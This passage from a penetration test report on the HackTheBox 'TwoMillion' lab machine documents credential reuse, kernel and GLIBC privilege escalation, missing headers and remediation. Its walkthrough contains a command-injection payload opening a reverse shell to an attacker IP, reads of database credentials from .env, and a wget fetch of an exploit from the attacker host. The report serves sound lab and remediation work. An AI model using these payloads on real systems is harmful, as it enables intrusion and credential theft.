5. Discovered internal email referencing kernel vulnerabilities (PT-006)

**Level of Access Obtained:** Interactive SSH shell as `admin` user

---

### IMPACT

*[Source: Analysis/Expert Interpretation]*

* **Persistent Access:** SSH access provides stable connection (vs. reverse shell)
* **Privilege Level:** `admin` user has higher privileges than `www-data`
* **Intelligence Gathering:** Access to user mailbox revealed patch status information
* **Attack Chain Continuation:** Platform for kernel-level privilege escalation

---

### LIKELIHOOD

*[Source: Industry Best Practice Assessment]*

**HIGH** - Given prior access:
* Credential reuse is common
* No password policy enforcement evident
* SSH service externally accessible

---

### RISK JUSTIFICATION

*[Source: Expert Generated - Risk Assessment]*

High severity assigned due to:
* Direct escalation of privileges
* Enables persistent access
* Common vulnerability pattern with high exploitability

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate Mitigation:**
* Rotate credentials for all affected accounts
* Implement unique passwords per service
* Enable SSH key-based authentication only

**Long-term Corrective Actions:**
* Implement centralized credential management
* Deploy multi-factor authentication for SSH
* Enforce password complexity policies
* Conduct regular password audits
* Implement separation of duties for service accounts

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Verify database and SSH credentials are unique
2. Confirm password rotation completed
3. Test SSH authentication with old credentials (should fail)
4. Validate MFA implementation if deployed

---

### REFERENCES

* CWE-255: https://cwe.mitre.org/data/definitions/255.html
* NIST Password Guidelines: https://pages.nist.gov/800-63-3/sp800-63b.html

---

### STATUS

**Open**

---

### RELATED FINDINGS

* PT-004: Sensitive Data Exposure - Source of credentials
* PT-006: OverlayFS LPE - Next step in attack chain

---

## FINDING ID: PT-006

**Finding Title:** CVE-2023-0386 - OverlayFS Local Privilege Escalation

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.8 (High)  
**Mapped Controls:**
- CVE-2023-0386
- CWE-269: Improper Privilege Management
- NIST 800-53: SI-2, CM-6
- RMF Families: SI, CM

**Impact:** Local privilege escalation from standard user to root.

---

### SUMMARY

*[Source: Analysis/Expert Interpretation]*

The target system is running a Linux kernel vulnerable to CVE-2023-0386, a flaw in the OverlayFS implementation that allows an unprivileged user to gain elevated privileges. The vulnerability exists in the way OverlayFS handles file permissions during copy-up operations, allowing preservation of SetUID bits on files copied from lower to upper layers.

---

### AFFECTED ASSETS

*[Source: Executed Logs - scans/nmap/10.129.229.66_os_detection.nmap]*

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| Linux Kernel | 2million.htb | Operating System | Production |

---

### VULNERABILITY TYPE

* Category: Privilege Escalation, Patch Management
* Associated weakness class: CWE-269
* CVE: CVE-2023-0386

---

### DESCRIPTION

*[Source: Analysis/Expert Interpretation, NVD]*

CVE-2023-0386 is a vulnerability in the Linux kernel's OverlayFS file system. The flaw exists in the `ovl_copy_up_meta_inode_data` function, which improperly handles file permissions when copying files from the lower layer to the upper layer.

**Vulnerability Details:**
* Files with SetUID/SetGID bits can be copied while preserving these permission bits
* An attacker can craft a malicious file on a FUSE filesystem with SetUID root
* When the file is copied to the upper OverlayFS layer, it retains the SetUID bit
* Executing this file grants root privileges

**Internal Email Evidence:**
*[Source: Executed Logs - scans/web/shell.log]*
```
From: ch4p <ch4p@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
```

---

### ATTACK VECTOR

*[Source: Analysis/Expert Interpretation]*

1. **Network Access:** Local access required
2. **Authentication Required:** Any local user account (admin via PT-005)
3. **User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: Executed Logs - logs/walkthrough.md, tasks.md]*

**Exploit Source:** https://github.com/xkaneiki/CVE-2023-0386.git

**Exploit Transfer:**
```bash
# Attack host
python3 -m http.server 8080

# Target host
wget http://10.10.14.114:8080/exploit.tar.gz
tar -xzf exploit.tar.gz
```

**Execution:**
Compiled and executed exploit to obtain root shell.

**Root Flag Retrieved:**
*[Source: tasks.md]*
```
Location: /root/root.txt
Flag: 1431fb0da4b48334a998a72a409cfba3
```

---

### EXPLOITATION DETAILS

*[Source: Executed Logs - logs/walkthrough.md]*

Exploitation was performed:
1. Identified CVE from internal email correspondence
2. Downloaded public exploit from GitHub
3. Transferred exploit to target via Python HTTP server
4. Compiled exploit on target system
5. Executed exploit to obtain root shell
6. Retrieved root flag from `/root/root.txt`

**Level of Access Obtained:** Root shell (full system compromise)

---

### IMPACT

*[Source: Analysis/Expert Interpretation]*

* **Complete System Compromise:** Full root access obtained
* **Data Breach:** Access to all system data
* **Persistence:** Potential for rootkit installation
* **Compliance Violation:** Unpatched critical vulnerability

---

### LIKELIHOOD

*[Source: Industry Best Practice Assessment]*

**HIGH** - Given local access:
* Public exploit available
* No kernel mitigations detected
* Internal knowledge of vulnerability (email)

---

### RISK JUSTIFICATION

*[Source: Expert Generated - Risk Assessment]*

High severity assigned due to:
* Direct path to root access
* Public exploit availability
* Complete system compromise achieved

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate Mitigation:**
* Apply kernel security patches immediately
* Update to kernel version with CVE-2023-0386 fix
* Consider disabling OverlayFS if not required

**Long-term Corrective Actions:**
* Implement automated patch management
* Subscribe to security mailing lists (linux-kernel, ubuntu-security)
* Deploy kernel live patching solution
* Implement regular vulnerability scanning
* Consider container-based isolation

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Verify kernel version is patched: `uname -r`
2. Check for CVE-2023-0386 patches: `apt changelog linux-image-$(uname -r)`
3. Test exploit (in lab environment) to confirm remediation
4. Validate automated patching is functional

---

### REFERENCES

* CVE-2023-0386: https://nvd.nist.gov/vuln/detail/CVE-2023-0386
* Exploit Repository: https://github.com/xkaneiki/CVE-2023-0386.git
* Ubuntu Security Notice: https://ubuntu.com/security/CVE-2023-0386

---

### STATUS

**Open**

---

### RELATED FINDINGS

* PT-005: Credential Reuse - Required for local access
* PT-007: GLIBC Vulnerability - Alternative privilege escalation vector

---

## FINDING ID: PT-007

**Finding Title:** CVE-2023-4911 - GLIBC Looney Tunables Local Privilege Escalation (Alternative Vector)

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.8 (High)  
**Mapped Controls:**
- CVE-2023-4911
- CWE-122: Heap-based Buffer Overflow
- NIST 800-53: SI-2, CM-6
- RMF Families: SI, CM

**Impact:** Alternative local privilege escalation vector from standard user to root.

---

### SUMMARY

*[Source: Analysis/Expert Interpretation]*

The target system is running GLIBC version 2.35, which is vulnerable to CVE-2023-4911 (nicknamed "Looney Tunables"). This buffer overflow vulnerability in the dynamic loader's handling of the `GLIBC_TUNABLES` environment variable allows local attackers to gain root privileges.

---

### AFFECTED ASSETS

*[Source: Executed Logs - tasks.md]*

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| GLIBC 2.35 | 2million.htb | C Library | Production |

---

### VULNERABILITY TYPE

* Category: Privilege Escalation, Buffer Overflow
* Associated weakness class: CWE-122
* CVE: CVE-2023-4911

---

### DESCRIPTION

*[Source: Analysis/Expert Interpretation, NVD]*

CVE-2023-4911 is a buffer overflow vulnerability in GNU C Library's dynamic loader (`ld.so`). The flaw exists in the processing of the `GLIBC_TUNABLES` environment variable, where insufficient bounds checking allows an attacker to overflow a buffer and gain code execution with elevated privileges.

**GLIBC Version Confirmation:**
*[Source: tasks.md]*
```bash
ldd --version
# Output: ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
```

GLIBC version 2.35 is confirmed vulnerable to this exploit.

---

### ATTACK VECTOR

*[Source: Analysis/Expert Interpretation]*

1. **Network Access:** Local access required
2. **Authentication Required:** Any local user account
3. **User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: Executed Logs - tasks.md, Analysis/Expert Interpretation]*

**Vulnerability Confirmation:**
```bash
admin@2million:~$ ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
```

**Note:** While this vulnerability was identified as an alternative privilege escalation vector, CVE-2023-0386 (PT-006) was used for the primary exploitation path. This finding documents the presence of an additional critical vulnerability.

---

### EXPLOITATION DETAILS

*[Source: tasks.md]*

**Exploitation Note:** This vulnerability was identified but not exploited during testing, as CVE-2023-0386 was used as the primary privilege escalation vector. Public exploits exist for this vulnerability.

---

### IMPACT

*[Source: Analysis/Expert Interpretation]*

* **Complete System Compromise:** Root access achievable
* **Wide Attack Surface:** Affects any SUID binary using GLIBC
* **Reliability:** Multiple public exploits available

---

### LIKELIHOOD

*[Source: Industry Best Practice Assessment]*

**HIGH** - Given local access:
* GLIBC is present on virtually all Linux systems
* Multiple public exploits available
* Affects common SUID binaries like `su`, `sudo`, `passwd`

---

### RISK JUSTIFICATION

*[Source: Expert Generated - Risk Assessment]*

High severity assigned due to:
* Direct path to root access (alternative to PT-006)
* Wide-spread affected component (GLIBC)
* Public exploit availability

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate Mitigation:**
* Update GLIBC to patched version
* Apply Ubuntu security updates: `apt update && apt upgrade`

**Long-term Corrective Actions:**
* Implement automated security patching
* Monitor for GLIBC security advisories
* Consider containerization to limit exploitation scope
* Implement regular vulnerability scanning

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Verify GLIBC version: `ldd --version`
2. Check for security updates: `apt list --upgradable`
3. Confirm GLIBC_TUNABLES vulnerability is patched

---

### REFERENCES

* CVE-2023-4911: https://nvd.nist.gov/vuln/detail/CVE-2023-4911
* Qualys Advisory: https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt
* Ubuntu Security Notice: https://ubuntu.com/security/CVE-2023-4911

---

### STATUS

**Open**

---

### RELATED FINDINGS

* PT-006: OverlayFS LPE - Primary privilege escalation method used
* PT-005: Credential Reuse - Required for local access

---

## FINDING ID: PT-008

**Finding Title:** Missing HTTP Security Headers

**Severity:** Low  
**Risk Rating:** CVSS v3.1: 4.3 (Medium) - *Informational Impact*  
**Mapped Controls:**
- CWE-1021: Improper Restriction of Rendered UI Layers or Frames
- CWE-16: Configuration
- NIST 800-53: SC-8, SI-11
- OWASP: A05:2021 – Security Misconfiguration

**Impact:** Increased risk of client-side attacks including clickjacking and MIME-type confusion.

---

### SUMMARY

*[Source: Analysis/Expert Interpretation]*

The web application is missing several security headers that help protect against common client-side attacks. While not directly exploitable for server compromise, these missing headers increase the application's attack surface for phishing and cross-site scripting attacks.

---

### AFFECTED ASSETS

*[Source: Executed Logs - scans/web/nikto.log]*

| Asset | IP / Hostname | Role | Environment |
|-------|---------------|------|-------------|
| nginx | 2million.htb | Web Server | Production |

---

### VULNERABILITY TYPE

* Category: Security Misconfiguration
* Associated weakness class: CWE-1021, CWE-16

---

### DESCRIPTION

*[Source: Executed Logs - scans/web/nikto.log - Executed 2026-01-19 16:50:08]*

Nikto scan identified the following missing security headers:

```
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ /: Cookie PHPSESSID created without the httponly flag.
```

**Missing Headers:**
| Header | Purpose | Risk |
|--------|---------|------|
| X-Frame-Options | Prevents clickjacking attacks | Medium |
| X-Content-Type-Options | Prevents MIME-type sniffing | Low |
| HttpOnly (Cookie Flag) | Prevents cookie theft via XSS | Medium |

---

### ATTACK VECTOR

*[Source: Analysis/Expert Interpretation]*

1. **Network Access:** Remote/External
2. **Authentication Required:** None
3. **User Interaction:** Required (user must visit attacker's page)

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: Executed Logs - scans/web/nikto.log, scans/web/whatweb.lob]*

**Nikto Output:**
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.229.66
+ Target Hostname:    2million.htb
+ Target Port:        80
+ Server: nginx
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ /: Cookie PHPSESSID created without the httponly flag.
```

**HTTP Response Headers:**
*[Source: scans/web/whatweb.lob]*
```
HTTP/1.1 200 OK
Server: nginx
Set-Cookie: PHPSESSID=ashmp2b1tojle17f85ljv09b5d; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```

---

### IMPACT

*[Source: Analysis/Expert Interpretation]*

* **Clickjacking:** Application can be embedded in malicious iframes
* **Cookie Theft:** Session cookies accessible via JavaScript if XSS exists
* **MIME Confusion:** Browser may interpret files incorrectly

---

### LIKELIHOOD

*[Source: Industry Best Practice Assessment]*

**LOW** - Requires additional vulnerabilities or social engineering

---

### RISK JUSTIFICATION

*[Source: Expert Generated - Risk Assessment]*

Low severity assigned as:
* Defense-in-depth measures
* Requires additional vulnerabilities for exploitation
* Does not directly lead to system compromise

---

### RECOMMENDATIONS

*[Source: Industry Best Practice - OWASP]*

**Immediate Mitigation:**
Add the following headers to nginx configuration:

```nginx
# nginx.conf or site configuration
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self';" always;
```

**PHP Session Configuration:**
```php
// php.ini or application bootstrap
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = Strict
```

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert Generated]*

1. Verify headers present in HTTP responses: `curl -I http://2million.htb/`
2. Test clickjacking protection: Attempt to embed in iframe
3. Verify cookie flags: Inspect Set-Cookie header

---

### REFERENCES

* OWASP Secure Headers: https://owasp.org/www-project-secure-headers/
* CWE-1021: https://cwe.mitre.org/data/definitions/1021.html

---

### STATUS

**Open**

---

## INTERNAL NETWORK COMPROMISE WALKTHROUGH

*[Source: Executed Logs - logs/walkthrough.md, scans/web/shell.log, tasks.md]*

This section documents the complete attack path demonstrating how individual findings were chained to achieve full system compromise.

### ATTACK CHAIN VISUALIZATION

```
┌─────────────────────────────────────────────────────────────────────┐
│                    EXTERNAL ATTACKER (Unauthenticated)               │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│  PHASE 1: RECONNAISSANCE                                             │
│  [Source: scans/nmap/10.129.229.66_initial_scan.nmap]               │
│  • Port scan identified SSH (22) and HTTP (80)                       │
│  • Web fingerprinting: nginx + PHP + PHPSESSID                       │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│  PHASE 2: INITIAL ACCESS (PT-001)                                    │
│  [Source: evidence/inviteapi.min.js, logs/walkthrough.md]           │
│  • Deobfuscated inviteapi.min.js                                    │
│  • Executed makeInviteCode() function                                │
│  • Decoded ROT13 → Base64 → Invite Code: ZYWVC-MS3EL-Z97AB-83QGH    │
│  • Registered account: test:test123                                  │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│  PHASE 3: PRIVILEGE ESCALATION - APPLICATION (PT-002)                │
│  [Source: scans/web/browser.log]                                     │
│  • PUT /api/v1/admin/settings/update {"is_admin": 1}                │
│  • Elevated to application administrator                             │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│  PHASE 4: REMOTE CODE EXECUTION (PT-003)                             │
│  [Source: scans/web/shell.log]                                       │
│  • POST /api/v1/admin/vpn/generate                                   │
│  • Payload: {"username": "test;bash -c 'bash -i >& /dev/tcp/...'"} │
│  • Obtained reverse shell as www-data                                │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│  PHASE 5: CREDENTIAL HARVESTING (PT-004)                             │
│  [Source: scans/web/shell.log]                                       │
│  • cat /var/www/html/.env                                            │
│  • DB_USERNAME=admin, DB_PASSWORD=SuperDuperPass123                  │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│  PHASE 6: LATERAL MOVEMENT (PT-005)                                  │
│  [Source: logs/walkthrough.md]                                       │
│  • ssh admin@2million.htb (SuperDuperPass123)                        │
│  • USER FLAG: 9f5610c657f44776c417d0d9e83ab74d                       │
│  • Discovered kernel CVE hint in /var/mail/admin                     │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│  PHASE 7: PRIVILEGE ESCALATION - OS (PT-006)                         │
│  [Source: logs/walkthrough.md, tasks.md]                             │
│  • Exploited CVE-2023-0386 (OverlayFS)                               │
│  • Obtained root shell                                               │
│  • ROOT FLAG: 1431fb0da4b48334a998a72a409cfba3                       │
└─────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────┐
│                        FULL SYSTEM COMPROMISE                        │
│                              ROOT ACCESS                             │
└─────────────────────────────────────────────────────────────────────┘
```

### DETAILED WALKTHROUGH

#### Step 1: Network Reconnaissance
*[Source: scans/nmap/10.129.229.66_initial_scan.nmap]*

```bash
# Command executed: 2026-01-19 16:23:16
nmap -Pn -sS -sV -T4 10.129.229.66
```

**Result:** Two open TCP ports identified (22/SSH, 80/HTTP)

#### Step 2: HTTP Redirect Discovery
*[Source: scans/web/curl.log]*

```bash
# Command executed: 2026-01-19 16:34:15
curl -I 10.129.229.66
```

**Result:** HTTP 301 redirect to `http://2million.htb/`

#### Step 3: Hostname Resolution
*[Source: logs/walkthrough.md]*

```bash
echo "10.129.229.66 2million.htb" >> /etc/hosts
```

#### Step 4: Web Application Enumeration
*[Source: scans/web/gobuster.log, nikto.log, whatweb.lob, WafW00f.log]*

- Gobuster: Virtual host enumeration
- Nikto: Vulnerability scan
- WhatWeb: Technology fingerprinting
- WafW00f: No WAF detected

#### Step 5: Invite Code Bypass
*[Source: evidence/inviteapi.min.js, logs/walkthrough.md]*

1. Identified `inviteapi.min.js` on `/invite` page
2. Deobfuscated code revealed `makeInviteCode()` function
3. Executed function in browser console
4. Decoded ROT13 response → POST endpoint
5. Retrieved Base64-encoded invite code
6. Decoded: `ZYWVC-MS3EL-Z97AB-83QGH`
7. Registered account successfully

#### Step 6: API Enumeration & Privilege Escalation
*[Source: scans/web/dirb.log, ffuf.log, browser.log]*

```bash
# Command executed: 2026-01-19 17:34:39
dirb http://2million.htb/api/v1/admin/
```

**Result:** `/api/v1/admin/auth` discovered (401)

**Privilege Escalation:**
```javascript
fetch("http://2million.htb/api/v1/admin/settings/update", {
    method: "PUT",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({"email":"test2@test.com","is_admin":1}),
})
```

**Response:** `{"id":14,"username":"test2","is_admin":1}`

#### Step 7: Command Injection & Reverse Shell
*[Source: scans/web/shell.log]*

**Netcat Listener:**
```bash
nc -lvnp 4444
```

**Payload:**
```json
{"username": "test;bash -c 'bash -i >& /dev/tcp/10.10.14.114/4444 0>&1'"}
```

**Result:** Reverse shell as `www-data`

#### Step 8: Credential Discovery
*[Source: scans/web/shell.log]*

```bash
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

#### Step 9: SSH Lateral Movement
*[Source: logs/walkthrough.md]*

```bash
ssh admin@2million.htb
# Password: SuperDuperPass123
```

**User Flag:** `9f5610c657f44776c417d0d9e83ab74d`

#### Step 10: Email Discovery & CVE Identification
*[Source: scans/web/shell.log]*

```bash
admin@2million:~$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
Subject: Urgent: Patch System OS
...
That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
```

#### Step 11: Kernel Exploitation (CVE-2023-0386)
*[Source: logs/walkthrough.md, tasks.md]*

```bash
# Transfer exploit
wget http://10.10.14.114:8080/exploit.tar.gz
tar -xzf exploit.tar.gz
# Compile and execute
make
./exploit
```

**Root Flag:** `1431fb0da4b48334a998a72a409cfba3`

---

## REMEDIATION SUMMARY

*[Source: Expert Generated - Industry Best Practice]*

### SHORT TERM (0-30 Days)

| Priority | Finding | Action |
|----------|---------|--------|
| **Critical** | PT-003 | Disable VPN generation endpoint; implement input sanitization |
| **Critical** | PT-002 | Add authorization checks to admin API endpoints |
| **Critical** | PT-006 | Apply kernel patches for CVE-2023-0386 |
| **Critical** | PT-007 | Update GLIBC to patched version |
| **High** | PT-004 | Rotate all credentials; move .env outside web root |
| **High** | PT-005 | Implement unique credentials per service |

### MEDIUM TERM (30-90 Days)

| Priority | Finding | Action |
|----------|---------|--------|
| **High** | PT-001 | Move invite code logic server-side |
| **Medium** | PT-008 | Implement security headers in nginx configuration |
| **Medium** | All | Deploy Web Application Firewall (WAF) |
| **Medium** | All | Implement centralized logging and SIEM integration |

### LONG TERM (90+ Days)

| Priority | Finding | Action |
|----------|---------|--------|
| **High** | All | Establish Secure Development Lifecycle (SDLC) |
| **High** | PT-006, PT-007 | Implement automated patch management |
| **Medium** | All | Conduct regular penetration testing (quarterly) |
| **Medium** | All | Deploy continuous vulnerability scanning |
| **Medium** | PT-005 | Implement secrets management solution |

### TECHNICAL FINDINGS DETAILS

Complete technical details for each finding are documented in the individual finding sections above.

### CAVEATS

*[Source: Expert Generated - Standard Disclaimers]*

* Testing was conducted within the HackTheBox lab environment scope
* Testing was time-bound to the specified assessment period
* Some vulnerabilities may exist that were not identified during this assessment
* Absence of a finding does not guarantee absence of vulnerability
* Public exploits were used where available; custom exploit development was not in scope

---

## APPENDICES

### APPENDIX A – FINDING SEVERITIES

*[Source: Industry Best Practice - CVSS v3.1]*

| Severity | CVSS Range | Description |
|----------|------------|-------------|
| **Critical** | 9.0 - 10.0 | Immediate action required; full system compromise possible |
| **High** | 7.0 - 8.9 | Significant risk; should be addressed within 30 days |
| **Medium** | 4.0 - 6.9 | Moderate risk; should be addressed within 90 days |
| **Low** | 0.1 - 3.9 | Minimal risk; address as part of regular maintenance |
| **Informational** | 0.0 | No direct security impact; best practice recommendation |

### APPENDIX B – EXPLOITED HOSTS

*[Source: Executed Logs]*

| Host | IP Address | Exploitation Method | Access Level |
|------|------------|---------------------|--------------|
| 2million.htb | 10.129.229.66 | Command Injection → SSH → Kernel LPE | Root |

### APPENDIX C – COMPROMISED USERS

*[Source: Executed Logs]*

| Username | Access Method | Privilege Level |
|----------|---------------|-----------------|
| test/test2 | Account registration (invite bypass) | Standard User |
| test/test2 | API privilege escalation | Administrator |
| www-data | Command injection reverse shell | Service Account |
| admin | SSH (credential reuse) | Local User |
| root | CVE-2023-0386 exploitation | Superuser |

### APPENDIX D – CHANGES/HOST CLEANUP

*[Source: Expert Generated]*

**Changes Made During Testing:**
1. User accounts created (test, test2)
2. Exploit files uploaded to /tmp directory
3. Reverse shell connections established

**Cleanup Recommendations:**
1. Remove test user accounts from application database
2. Delete uploaded exploit files from /tmp
3. Review and rotate any credentials that may have been logged
4. Clear shell history files

### APPENDIX E – PASSWORD REVIEW

*[Source: Executed Logs - scans/web/shell.log]*

| Account | Password | Strength | Issues |
|---------|----------|----------|--------|
| admin (DB/SSH) | SuperDuperPass123 | Medium | Predictable pattern, credential reuse |
| test (App) | test123 | Weak | Common password, no complexity |

**Password Policy Observations:**
* No password complexity requirements enforced
* Credential reuse across services
* No multi-factor authentication implemented
* No account lockout mechanisms observed

### APPENDIX F – TOOLS USED

*[Source: Executed Logs - scans/*, logs/*]*

| Tool | Purpose | Log File |
|------|---------|----------|
| Nmap 7.98 | Port scanning, service enumeration | scans/nmap/*.nmap |
| Nikto v2.5.0 | Web vulnerability scanning | scans/web/nikto.log |
| Gobuster v3.8 | Directory/vhost enumeration | scans/web/gobuster.log |
| DIRB v2.22 | Directory brute-forcing | scans/web/dirb.log |
| ffuf v2.1.0-dev | Web fuzzing | scans/web/ffuf.log |
| WhatWeb | Web fingerprinting | scans/web/whatweb.lob |
| wafw00f v2.3.2 | WAF detection | scans/web/WafW00f.log |
| ReconSpider | Web crawling | scans/web/ReconSpider.log |
| curl | HTTP requests | scans/web/curl.log |
| Netcat | Reverse shell listener | N/A |
| Python http.server | File transfer | N/A |

### APPENDIX G – LOG FILE REFERENCES

*[Source: Case Files Structure]*

```
cases/htb/TwoMillion/
├── evidence/
│   ├── inviteapi.min.js          # Captured JavaScript file
│   └── vpn.txt                    # Generated VPN configuration
├── logs/
│   └── walkthrough.md            # Attack methodology documentation
├── scans/
│   ├── nmap/
│   │   ├── 10.129.229.66_host_discovery.*
│   │   ├── 10.129.229.66_initial_scan.*
│   │   ├── 10.129.229.66_os_detection.*
│   │   ├── 10.129.229.66_udp_scan.*
│   │   └── 10.129.229.66_vuln_scan.*
│   └── web/
│       ├── browser.log           # Browser console interactions
│       ├── curl.log              # HTTP request/responses
│       ├── dirb.log              # Directory enumeration
│       ├── ffuf.log              # Fuzzing results
│       ├── gobuster.log          # Vhost enumeration
│       ├── nikto.log             # Vulnerability scan
│       ├── ReconSpider.log       # Web crawling
│       ├── shell.log             # Post-exploitation commands
│       ├── WafW00f.log           # WAF detection
│       └── whatweb.lob           # Fingerprinting
├── tasks.md                       # Task completion summary
└── TwoMillion_summary_report.md   # Previous summary report
```

---

**END OF REPORT**

*Report Generated: January 19, 2026*  
*Classification: CONFIDENTIAL*
